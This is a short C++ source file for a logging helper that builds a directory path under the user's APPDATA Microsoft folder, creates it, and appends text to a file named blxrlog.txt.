#include "stream.h"
#include <iostream>

#define APPDATA "APPDATA"
#define LOG_FILE_NAME "blxrlog.txt"

// TODO Doesn't work when not initialized on declaration
stream::LogFile* log_file = new stream::LogFile(stream::GetPath(true), LOG_FILE_NAME);

std::string stream::GetPath(const bool append) {
  char* buf = nullptr;
  size_t size = 0;
  std::string app_data_dir;

  if (_dupenv_s(&buf, &size, APPDATA) == 0 && buf != nullptr) {
	app_data_dir = buf;
  }
  app_data_dir += "\\Microsoft\\blxr";
  if(append) {
	app_data_dir += "\\";
  }
  free(buf);

  return app_data_dir;
}

bool stream::MakeDir(const std::string &path) {
  return CreateDirectory(path.c_str(), nullptr)
  	|| GetLastError() == ERROR_ALREADY_EXISTS;
}

bool stream::WriteLog(const std::string& input) {
  log_file->ofstream_.open(log_file->path_full_, std::fstream::app);
  if(!log_file->ofstream_.is_open()) {
    return false;
  }

  log_file->ofstream_ << input;
  log_file->ofstream_.close();

  return true;
}
